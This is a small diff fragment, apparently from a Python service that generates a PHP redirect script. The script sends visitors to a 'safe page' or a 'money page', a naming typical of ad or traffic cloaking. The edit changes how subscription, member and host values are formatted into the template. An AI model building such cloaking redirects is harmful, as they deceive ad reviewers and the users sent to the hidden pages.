@@ -24,6 +24,6 @@ header("location: ".$a13['user_safe_page'], TRUE, 301);
 if( !empty($a13['money_page']))
 header("location: ".$a13['user_money_page'], TRUE, 301);
 ?>
-    """ % (str(subscription_id), str(member_id), str(request.host))
+    """ .format(str(subscription_id), str(member_id), str(request.host))
     return bytes(sr, 'utf-8')
 
